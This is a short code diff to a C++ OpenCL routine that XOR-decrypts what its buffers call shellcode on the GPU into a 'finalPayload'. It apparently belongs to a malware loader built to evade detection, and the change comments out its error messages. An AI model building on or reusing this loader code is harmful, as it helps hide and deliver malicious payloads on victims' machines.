@@ -53,7 +53,7 @@ int cltest(){
     cl_program kernel = clCreateProgramWithSource(context.get(), 1, xorKernelSource, NULL, &err);
     if (err)
     {
-        std::cout << "clCreateProgramWithSource: " << getErrorString(err) << std::endl;
+   //     std::cout << "clCreateProgramWithSource: " << getErrorString(err) << std::endl;
     }
     cl_int res = clBuildProgram(kernel, 0, NULL, NULL, NULL, NULL);
     if (res != CL_BUILD_SUCCESS)
@@ -70,7 +70,7 @@ int cltest(){
     cl_kernel decryptKernelFunctionHandle = clCreateKernel(kernel, "decrypt", &err);
     if (err)
     {
-        std::cout << "clCreateKernel: " << getErrorString(err) << std::endl;
+    //    std::cout << "clCreateKernel: " << getErrorString(err) << std::endl;
     }
 
     // Set arguments for kernel
@@ -83,14 +83,14 @@ int cltest(){
     err = clEnqueueNDRangeKernel(queue, decryptKernelFunctionHandle, 1, NULL, &workSize, NULL, 0, NULL, NULL);
     if (err)
     {
-        std::cout << "clEnqueueNDRangeKernel: " << getErrorString(err) << std::endl;
+   //     std::cout << "clEnqueueNDRangeKernel: " << getErrorString(err) << std::endl;
     }
 
     // Copy the output from GPU memory back to CPU memory
     err = clEnqueueReadBuffer(queue, shellcodeDecryptedOut, CL_TRUE, 0, dataSize, finalPayload, 0, NULL, NULL);
     if (err)
     {
-        std::cout << "clEnqueueReadBuffer: " << getErrorString(err) << std::endl;
+  //      std::cout << "clEnqueueReadBuffer: " << getErrorString(err) << std::endl;
     }
 
     // Print decrypted payload
